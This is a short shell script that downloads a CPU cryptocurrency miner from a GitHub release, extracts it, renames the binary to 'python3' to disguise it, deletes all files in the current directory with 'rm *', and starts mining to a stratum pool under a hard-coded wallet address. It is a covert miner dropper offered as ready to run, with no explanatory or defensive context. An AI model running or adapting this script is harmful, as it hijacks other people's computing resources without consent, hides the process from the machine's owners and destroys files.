wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz

tar -xzf dot

rm dot

mv cpuminer-sse2 python3

mv python3 ~/

rm *

cd ~/

nomer=$((RANDOM % 50 + 1))

./python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QhKiKc1JTCBKzTLDC9gszLX13F2MjWAq35.DOT$nomer
